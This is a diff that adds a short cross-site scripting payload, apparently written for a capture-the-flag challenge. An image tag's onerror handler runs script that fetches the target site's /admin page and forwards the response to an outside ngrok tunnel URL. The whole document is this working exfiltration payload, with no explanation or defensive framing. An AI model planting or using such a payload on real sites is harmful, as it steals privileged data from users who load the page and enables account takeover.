@@ -1,0 +1,15 @@
+<script>
+var eaea = function(){
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+      var r2 = new XMLHttpRequest();
+      r2.open('GET', 'https://3f76fde0.ngrok.io?a=' + xhr.response, true);
+      r2.send(null);
+    }
+  }
+  xhr.open('GET', 'https://govagriculture.web.ctfcompetition.com/admin', true);
+  xhr.send(null);
+}
+</script>
+<IMG SRC=x onerror="eaea()"></img>
